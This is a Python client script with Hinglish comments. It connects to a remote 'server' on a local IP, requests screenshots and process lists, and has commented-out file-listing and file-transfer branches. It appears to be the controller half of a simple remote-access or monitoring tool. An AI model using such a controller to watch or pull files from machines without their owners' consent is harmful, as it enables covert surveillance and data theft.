import socket
import zlib
import struct
from PIL import Image
import cv2
import numpy as np
import os
import keyboard

def screeshare():
    try:
        # Screenshot size receive kare
        message_size = client_socket.recv(4)
        if not message_size:
            return
        message_size = struct.unpack("L", message_size)[0]
       
        # Screenshot data receive kare
        screenshot_data = b""
        while len(screenshot_data) < message_size:
            screenshot_data += client_socket.recv(4096)
       
        screenshot_data = zlib.decompress(screenshot_data)
        screenshot = Image.frombytes("RGB", (800, 600), screenshot_data)
        screenshot = np.array(screenshot)
        cv2.imshow('SCREEN', cv2.cvtColor(screenshot, cv2.COLOR_RGB2BGR))
        cv2.waitKey(0)
        
        # Screenshot lene ke baad condition true ho to yahan ke code chale
        print("Screenshot taken!")
        return True
    except:
        response = client_socket.recv(1025).decode()
        print(f"Server :{response}")
        return False

# Server ka IP address aur port number
SERVER_IP = '192.168.147.140'
SERVER_PORT = 54321

# Socket object banaye
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Server se connect kare
client_socket.connect((SERVER_IP, SERVER_PORT))

response = client_socket.recv(1025).decode()
print(f"Server :{response}")
# Message bheje
while True:
    # Send message to server
    message = input("Client :")
    client_socket.send(message.encode())
    
    if 'screenshot' in message:
        if screeshare():
            continue

    elif 'check process' in message:
        while True:
            response = client_socket.recv(1025).decode()
            print(f"Server :{response}")

    # elif 'show all files' in message:
    #     while True:
    #         response = client_socket.recv(1025).decode()
    #         print(response)
    #         file_path = "C:\WINDOW\TOOLS\CLIENT\All_files.txt"           
    #         try:
    #             with open(file_path, "r") as file:
    #                 content = file.read()

    #             with open(file_path, "w") as file:
    #                 file.write(content)
    #                 file.write("\n")
    #                 file.write(response)
    #         except Exception as e:
    #             print("An error occurred:", e)

    # elif 'send file' in message:
    #     file_name = input('Enter file name :')
    #     with open(file_name, "wb") as file:
    #         file.write(data)      
            
    # Receive response from server
    response = client_socket.recv(1025).decode()
    print(f"Server :{response}")

# Connection ko close kare
client_socket.close()
